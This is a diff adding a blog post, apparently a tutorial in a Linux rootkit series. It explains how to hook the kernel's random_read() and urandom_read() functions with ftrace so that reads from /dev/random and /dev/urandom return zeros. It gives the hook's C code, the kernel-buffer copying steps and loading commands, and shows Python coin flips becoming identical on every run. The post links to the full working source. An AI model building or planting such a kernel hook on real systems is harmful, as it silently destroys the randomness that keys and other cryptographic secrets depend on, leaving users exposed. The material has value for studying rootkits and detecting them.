@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Linux Rootkits Part 4: Backdooring PRNGs by Interfering with Char Devices :: TheXcellerator</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="We saw in Part 3 how easy it is to add some extra functionality to a syscall. This time we&amp;rsquo;re going to target a pair of kernel functions that are not syscalls, and can&amp;rsquo;t be called directly. To understand what these are, it&amp;rsquo;s worth discussing char devices a little first.
+Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;re probably already pretty familiar with a bunch of char (or chararacter) devices already." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/linux_rootkits_04/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="TheXcellerator" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Linux Rootkits Part 4: Backdooring PRNGs by Interfering with Char Devices :: TheXcellerator">
+<meta property="og:description" content="We saw in Part 3 how easy it is to add some extra functionality to a syscall. This time we&amp;rsquo;re going to target a pair of kernel functions that are not syscalls, and can&amp;rsquo;t be called directly. To understand what these are, it&amp;rsquo;s worth discussing char devices a little first.
+Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;re probably already pretty familiar with a bunch of char (or chararacter) devices already." />
+<meta property="og:url" content="/posts/linux_rootkits_04/" />
+<meta property="og:site_name" content="Linux Rootkits Part 4: Backdooring PRNGs by Interfering with Char Devices" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="linux" />
+
+  <meta property="article:section" content="cryptography" />
+
+
+  <meta property="article:published_time" content="2020-09-09 21:00:00 &#43;0100 BST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    TheXcellerator
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/categories/cryptography/">Cryptography</a></li>
+        
+      
+        
+          <li><a href="/categories/linux/">Linux</a></li>
+        
+      
+        
+          <li><a href="/categories/other/">Other</a></li>
+        
+      
+        
+          <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/categories/cryptography/">Cryptography</a></li>
+      
+    
+      
+        <li><a href="/categories/linux/">Linux</a></li>
+      
+    
+      
+        <li><a href="/categories/other/">Other</a></li>
+      
+    
+      
+        <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/linux_rootkits_04/">Linux Rootkits Part 4: Backdooring PRNGs by Interfering with Char Devices</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-09-09
+    </span>
+    
+    
+    <span class="post-author">::
+      TheXcellerator
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="/tags/rootkit/">rootkit</a>&nbsp;
+    
+    #<a href="/tags/char/">char</a>&nbsp;
+    
+    #<a href="/tags/device/">device</a>&nbsp;
+    
+    #<a href="/tags/random/">random</a>&nbsp;
+    
+    #<a href="/tags/urandom/">urandom</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>We saw in <a href="../linux_rootkits_03/">Part 3</a> how easy it is to add some extra functionality to a syscall. This time we&rsquo;re going to target a pair of kernel functions that are <em>not</em> syscalls, and can&rsquo;t be called directly. To understand what these are, it&rsquo;s worth discussing <em>char devices</em> a little first.</p>
+<h1 id="char-devices-in-linux">Char Devices in Linux<a href="#char-devices-in-linux" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Although you might not recognise the name, you&rsquo;re probably already pretty familiar with a bunch of <em>char</em> (or <em>char</em>aracter) devices already. They usually live under <code>/dev/</code> and their source code can be found in <a href="https://github.com/torvalds/linux/tree/master/drivers/char"><code>drivers/char</code></a>. Perhaps the most common ones are <code>random</code> and <code>urandom</code> which are the two that we are going to be targetting a little later on.</p>
+<p>Essentially, a char device is some functionality of the kernel where it makes sense to expose it to the user as a <em>file</em>. This is particularly clear with things like <code>random</code> and <code>urandom</code> - if we want the kernel to give us some random bytes then we just read from either of these (normally using <code>dd</code>).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/random bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> | xxd
+00000000: a1ec bdbd 638c dabd 4c04 e018 9cc0 <span style="color:#ae81ff">0993</span>  ....c...L.......
+00000010: 50e1 b686 <span style="color:#ae81ff">8997</span> <span style="color:#ae81ff">3572</span> c0ec d05c d799 <span style="color:#ae81ff">9103</span>  P.....5r...<span style="color:#ae81ff">\.</span>...
+32+0 records in
+32+0 records out
+<span style="color:#ae81ff">32</span> bytes copied, 0.000535243 s, 59.8 kB/s
+</code></pre></div><p>Don&rsquo;t be decieved into thinking that it&rsquo;s a real file! If you mounted your harddrive on another machine you <em>would not</em> find any of these char devices. Taking a look at <code>random</code> with <code>file</code>, we see:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file /dev/random
+/dev/random: character special <span style="color:#f92672">(</span>1/8<span style="color:#f92672">)</span>
+</code></pre></div><p>This reinforces the fact we are not dealing with actual files - even if they behave like them!</p>
+<blockquote>
+<p>The difference between <code>/dev/random</code> and <code>/dev/urandom</code> is actually fairly subtle. Ultimately it&rsquo;s all down to the available <em>entropy</em> of the system - which you can think about as a measure of randomness. Both char devices source their entropy from the same CSPRNG (Cryptographically Secure Pseudo Random Number Generator), but the difference is that <code>/dev/random</code> will stop producing bytes if the entropy runs out - a process known as <em>blocking</em>, whereas <code>/dev/urandom</code> uses a few tricks to continually seed an internal state in order to carry on producing bytes indefinitely. <em>Technically</em>, <code>/dev/random</code> is the safer choice, but <em>practically</em> it isn&rsquo;t as reliable as <code>/dev/urandom</code> and is prone to creating race conditions. It&rsquo;s also worth noting that the syscall <a href="https://man7.org/linux/man-pages/man2/getrandom.2.html"><code>sys_getrandom()</code></a> reads from <code>/dev/urandom</code> by default, which we&rsquo;ll see later on.</p>
+</blockquote>
+<p>So, how does the kernel decide what to do when we try to read or write to a char device? If you guessed that it uses a struct, then you guessed right! Each char device has a <code>file_operations</code> struct assigned to it (which basically forms its definition). The struct contains a <code>.read</code> and <code>.write</code> field among others, which contain points to functions!</p>
+<p>It&rsquo;s as simple as that - when we try to read from a char device, we execute the function pointed to the by the <code>.read</code> field of the corresponding <code>file_operations</code> struct.</p>
+<p>We really ought to understand a little about how reads are done in the first place then - especially if we want to get in the middle of these reads and interfere with them! Looking up <code>sys_read</code> in the <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a> tells us that it takes 3 arguments: a file descriptor, a buffer, and the number of bytes to read. It&rsquo;s worth taking a closer look at these 3 things.</p>
+<ul>
+<li>The file descriptor is just a number that has been assinged to a certain file. If we were programming in userspace, we&rsquo;d first need to use the <code>sys_open</code> syscall which takes a filename as one of its arguments and returns a file descriptor. Seeing as we will be working from the kernel, we don&rsquo;t really to worry about this bit because a file descriptor will already have been assigned to either <code>/dev/random</code> or <code>/dev/urandom</code> by the time <code>sys_read</code> is called.</li>
+<li>The buffer is the more interesting part and is what we will have to concern ourselves with later. What is supposed to happen is that the user is meant to allocate an empty buffer somewhere in memory and then give <code>sys_read</code> a pointer to this buffer. Then the kernel will read from whatever the file descriptor is assigned to, into this buffer.</li>
+<li>Finally, the number of bytes to read is just that - how many bytes should be read from the thing pointed to by the file descriptor. When a read is performed, we automatically seek forwards by however many bytes we read. While this doesn&rsquo;t matter for char devices, it&rsquo;s worth keeping in mind when you&rsquo;re dealing with anything involving <code>sys_read</code>.</li>
+</ul>
+<p>The value returned by <code>sys_read</code> (into <code>eax</code>) is the number of bytes that were successfully read. Let me repeat: the only thing returned by <code>sys_read</code> is the number of bytes that were read. If you&rsquo;ve come from the world of interpreted languages (like Python) then this might surprise you. We have to supply <code>sys_read</code> with a buffer to store the data it reads for us.</p>
+<p>The other important thing to point out is that <code>sys_read</code> doesn&rsquo;t know what it&rsquo;s reading from - all it has is a file descriptor! If we wanted to manipulate reads to <code>random</code> and <code>urandom</code> using syscalls, we&rsquo;d have to hook both <code>sys_read</code> and <code>sys_open</code>. Then we&rsquo;d have to wait for something to try to <em>open</em> either of the char devices, log the file descriptor it returns somewhere and wait for something to <em>read</em> from it. In fact, we&rsquo;d also have to hook <code>sys_close</code> as well so we&rsquo;d know when to stop watching for a file descriptor too! Sounds complicated, right? Luckily we can hook more than just syscalls!</p>
+<h1 id="the-char-devices-read-routines">The char device&rsquo;s read routines<a href="#the-char-devices-read-routines" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Let&rsquo;s take a look at <a href="https://github.com/torvalds/linux/blob/dd9fb9bb3340c791a2be106fdc895db75f177343/drivers/char/random.c#L1989"><code>drivers/char/random.c</code></a> where we have the following two snippets:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations random_fops <span style="color:#f92672">=</span> {
+    .read <span style="color:#f92672">=</span> random_read,
+    .write <span style="color:#f92672">=</span> random_write,
+    <span style="color:#75715e">/* trimmed for clarity */</span>
+};
+
+<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations urandom_fops <span style="color:#f92672">=</span> {
+    .read <span style="color:#f92672">=</span> urandom_read,
+    .write <span style="color:#f92672">=</span> urandom_write,
+    <span style="color:#75715e">/* trimmed for clarity */</span>
+};
+</code></pre></div><p>This tells us that whenever something tries to read from <code>/dev/random</code> or <code>/dev/urandom</code>, the functions <code>random_read()</code> or <code>urandom_read()</code> are called respectively. Taking a look at one of these functions, <a href="https://github.com/torvalds/linux/blob/dd9fb9bb3340c791a2be106fdc895db75f177343/drivers/char/random.c#L1861">we find</a>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> ssize_t
+<span style="color:#a6e22e">random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+{
+    <span style="color:#66d9ef">int</span> ret;
+    
+    ret <span style="color:#f92672">=</span> wait_for_random_bytes();
+    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> ret;
+    <span style="color:#66d9ef">return</span> urandom_read_nowarn(file, buf, nbytes, ppos);
+}
+</code></pre></div><p>This looks exactly like something we can hook!</p>
+<p>The guts of this function are fairly unimportant because our eventual hook will start off by calling this function in full anyway. What <em>is</em> important is the way the function is defined because we will need to emulate it in our rootkit. Notice that the 2nd and 3rd arguments are a <em>buffer</em> and a <em>size</em> - these are the arguments passed from <code>sys_read()</code> that we discussed earlier! Notice aswell the <code>__user</code> identifier - this will be very important a little later.</p>
+<h1 id="writing-the-rootkit">Writing the rootkit<a href="#writing-the-rootkit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We are going to be hooking both <code>random_read()</code> and <code>urandom_read()</code> which will allow us to make changes to the buffer containing the read data before returning to userspace.</p>
+<p>Whenever we want to hook a function with ftrace, we need to check that the symbol name is exported by the kernel. This is certainly the case for all the syscalls but, seeing as neither of our targets are in the syscall table, we&rsquo;d better check manually. As mentioned in earlier posts, this is done by looking at <code>/proc/kallsyms</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo cat /proc/kallsyms | grep random_read
+/* redacted <span style="color:#66d9ef">for</span> clarity */
+ffffffff84c934a0 t random_read
+ffffffff84c934d0 t urandom_read
+</code></pre></div><p>Okay, all good. The first thing we need to do now is get our function declarations right for the <em>original</em> copies:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_random_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos);
+<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_urandom_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos);
+</code></pre></div><p>Now we get to writing the actual hook. I&rsquo;m only going to through the hook for <code>random_read()</code> because it is <em>identical</em> for <code>urandom_read()</code>, except we stick an extra <code>u</code> in. You&rsquo;ll see why this is the case as we work through it.</p>
+<p>Recall that <code>sys_read()</code> returns the number of bytes successfully read? Well, <code>random_read()</code> does exactly the same thing! The very first thing our hook does is call <code>orig_random_read()</code> with all the arguments it&rsquo;s supplied with. Roughly, we have:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+{
+    <span style="color:#66d9ef">int</span> bytes_read;
+
+    bytes_read <span style="color:#f92672">=</span> orig_random_read(file, buf, nytes, ppos);
+    printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: intercepted read to /dev/random: %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bytes_read);
+
+    <span style="color:#75715e">/* do something to buf */</span>
+
+    <span style="color:#66d9ef">return</span> bytes_read;
+}
+</code></pre></div><p>If you stop here and flesh out the rest of the rootkit (ftrace, includes, etc) then you&rsquo;ll get a working kernel module that just prints to <code>dmesg</code> everytime we try to read from <code>/dev/random</code>. The real brains of this module is what we do to <code>buf</code> before returning to userspace.</p>
+<p>For simplicity, we are just going to fill the buffer with <code>0x00</code>. Unfortunately (or <em>fortunately</em>, depending on how you see it), this isn&rsquo;t as easy as it might sound. The reason is partly due to to the presence of the <code>__user</code> identifier for the buffer. This reminds the kernel (and us!) that <code>buf</code> points to <em>an address in userspace virtual memory</em>. We don&rsquo;t know where this virtual address maps to physically, so trying to perform a read or write operation will likely result in a segfault.</p>
+<p>The solution to this problem is to use the <code>copy_from_user()</code> and <code>copy_to_user()</code> functions, which allow us to copy data between arrays in both user- and kernel-space. For this module, we only really need <code>copy_to_user()</code>, but I&rsquo;m going to use both anyway to show you how they work.</p>
+<p>To get started, we need an array of our own in kernelspace. If you&rsquo;ve ever used <code>malloc()</code> in C then this will be very familiar to you. We use the function <code>kzalloc()</code>, which takes 2 arguments; a size and some flags. It then allocates a region of memory of the size we wanted and returns the address to us. When we are done with this buffer, we use <code>kfree()</code> tell the kernel that we no longer need that patch of memory. It looks something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
+<span style="color:#66d9ef">int</span> buf_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
+
+kbuf <span style="color:#f92672">=</span> kzalloc(buf_size, GFP_KERNEL);
+<span style="color:#66d9ef">if</span>(kbuf)
+    printk(KERN_ERROR <span style="color:#e6db74">&#34;could not allocate buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+<span style="color:#75715e">/* do something with the shiny new buffer */</span>
+
+kfree(kbuf);
+</code></pre></div><p>Pretty simple, right? The <code>GFP_KERNEL</code> flag indicates that this buffer is to be allocated in kernel memory - you can read more about the possible flags <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-kmalloc.html">here</a>.</p>
+<p>So, now we can use <code>copy_from_user()</code> to get the random bytes that were &ldquo;read&rdquo; from <code>/dev/random</code> (it&rsquo;s this step that we <em>could</em> skip because we only really need to copy the zero-filled buffer back to <code>buf</code>, but it&rsquo;ll be useful for later modules to see how this part works).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">long</span> error;
+
+error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, bytes_read);
+<span style="color:#66d9ef">if</span>(error)
+    printk(KERN_ERROR <span style="color:#e6db74">&#34;failed to copy from user space: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+
+<span style="color:#75715e">/* Fill kbuf with 0x00 */</span>
+
+error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, bytes_read);
+<span style="color:#66d9ef">if</span>(error)
+    printk(KERN_ERROR <span style="color:#e6db74">&#34;failed to copy back to user space: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+</code></pre></div><p>Putting it all together, we get the following hook:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+{
+    <span style="color:#66d9ef">int</span> bytes_read, i;
+    <span style="color:#66d9ef">long</span> error;
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
+
+    <span style="color:#75715e">/* Call the real random_read() */</span>
+    bytes_read <span style="color:#f92672">=</span> orig_random_read(file, buf, nbytes, ppos);
+
+    <span style="color:#75715e">/* Allocate a kernel buffer big enough to to hold everything */</span>
+    kbuf <span style="color:#f92672">=</span> kzalloc(bytes_read, GFP_KERNEL);
+    
+    <span style="color:#75715e">/* Copy the random bytes from the userspace buf */</span>
+    error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, bytes_read);
+
+    <span style="color:#75715e">/* Check for any errors in copying */</span>
+    <span style="color:#66d9ef">if</span>(error)
+    {
+        printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: %d bytes could not be copied into kbuf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+        kfree(kbuf);
+        <span style="color:#66d9ef">return</span> bytes_read;
+    }
+
+    <span style="color:#75715e">/* Fill kbuf with 0x00 */</span>
+    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> bytes_read ; i<span style="color:#f92672">++</span> )
+        kbuf[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+
+    <span style="color:#75715e">/* Copy the rigged buffer back to userspace */</span>
+    error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, bytes_read);
+    <span style="color:#66d9ef">if</span>(error)
+        printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: %d bytes could not be copied back into buf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+
+    <span style="color:#75715e">/* Free the buffer before returning */</span>
+    kfree(kbuf);
+    <span style="color:#66d9ef">return</span> bytes_read;
+}
+</code></pre></div><p>As you can see, there isn&rsquo;t anything specific to <code>/dev/random</code> here, so the exact same goes for the <code>hook_urandom_read()</code> function too (and any other char device you want to interfere with!).</p>
+<p>Putting the whole thing together complete with the ftrace code (the completed, working source code can be found on the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.7_char_interfering">repo</a>) we can start building and testing!</p>
+<blockquote>
+<p>Notice that we didn&rsquo;t have to worry about the whole doubling-up business with <code>pt_regs</code> structs like with the <code>sys_kill</code> hook in <a href="../linux_rootkits_03">Part 3</a>. This is because we aren&rsquo;t hooking a syscall in this rootkit - the way that a regular function is called by the kernel is unambiguous!</p>
+</blockquote>
+<p>Okay, if we go ahead and <code>make</code>, <code>insmod rootkit.ko</code>, etc, we can see what happens when we attempt to read from <code>/dev/random</code> or <code>/dev/urandom</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/random bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> | xxd
+00000000: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
+00000010: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
+32+0 records in
+32+0 records out
+<span style="color:#ae81ff">32</span> bytes copied, 0.0157476 s, 2.0 kB/s
+</code></pre></div><p>Whoop whoop! No more random bytes for you! There&rsquo;s a screenshot I took of this too on the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.7_char_interfering">repo</a> because I just think that this is so cool!</p>
+<p><img src="https://raw.githubusercontent.com/xcellerator/linux_kernel_hacking/master/3_RootkitTechniques/3.7_char_interfering/random.png" alt="random" title="Interfering with char devices"></p>
+<h1 id="where-can-we-go-with-this">Where can we go with this?<a href="#where-can-we-go-with-this" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Obviously, not being able to obtain any random bytes seriously undermines the cryptographic security of the system. The most common way for a program in userspace to interface with these char devices is the <code>sys_getrandom()</code> syscall. As mentioned earlier, this syscall uses <code>/dev/urandom</code> by default (but can also use <code>/dev/random</code> if supplied with the <code>GRND_RANDOM</code> flag) so that hook in particular has a very wide ranging affect.</p>
+<p>Let&rsquo;s put together a quick-and-dirty python script to calculate some random numbers:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+
+<span style="color:#f92672">import</span> random
+
+SAMPLE_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>
+
+headcount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+coinflips <span style="color:#f92672">=</span> []
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(SAMPLE_SIZE):
+    newflip <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">if</span> ( newflip <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ):
+        headcount <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+    coinflips<span style="color:#f92672">.</span>append(newflip)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Heads: &#34;</span> <span style="color:#f92672">+</span> str(headcount))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Tails: &#34;</span> <span style="color:#f92672">+</span> str(SAMPLE_SIZE <span style="color:#f92672">-</span> headcount))
+</code></pre></div><p>Let&rsquo;s run this a few times and see what happens:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./check.py
+Heads: <span style="color:#ae81ff">515</span>
+Tails: <span style="color:#ae81ff">485</span>
+$ ./check.py
+Heads: <span style="color:#ae81ff">515</span>
+Tails: <span style="color:#ae81ff">485</span>
+$ ./check.py
+Heads: <span style="color:#ae81ff">515</span>
+Tails: <span style="color:#ae81ff">485</span>
+</code></pre></div><p>I think you get the idea&hellip; We have dramatically reduced the randomness available (in the case of this particular statistic, we&rsquo;ve reduced it to zero!). Just for comparison, let&rsquo;s see what happens if we run that Python script again after unloading the rootkit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./check.py
+Heads: <span style="color:#ae81ff">483</span>
+Tails: <span style="color:#ae81ff">517</span>
+$ ./check.py
+Heads: <span style="color:#ae81ff">496</span>
+Tails: <span style="color:#ae81ff">504</span>
+$ ./check.py
+Heads: <span style="color:#ae81ff">508</span>
+Tails: <span style="color:#ae81ff">492</span>
+</code></pre></div><p>The randomness has returned!</p>
+<p>We know that Python is using <code>sys_getrandom()</code> to generate our &ldquo;coin flips&rdquo; (which we could have checked by either using strace, or adding a <code>printf()</code> call to the <code>hook_urandom_read()</code> hook). It&rsquo;s worth noting that Python mitigates some of the damage by only using <code>sys_getrandom()</code> to seed it&rsquo;s internal RNG. This can be seen by modifying the Python script to continually print out coin flips instead of just one. If we did that, we&rsquo;d see that the the proportion of coin flips would change each iteration, but would give the same numbers each time we ran it! If you want to check for yourself, try <a href="https://gist.github.com/xcellerator/6ed99ebbe75f6804397f5d7cd9c455e1">this</a> with and without the rootkit loaded.</p>
+<p>I&rsquo;m working on a better example involving ssh-keygen, but that will have to wait until another time&hellip;</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/linux_rootkits_03/">
+                <span class="button__text">Linux Rootkits Part 3: A Backdoor to Root</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Harvey Phillips 2020 - London, England</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
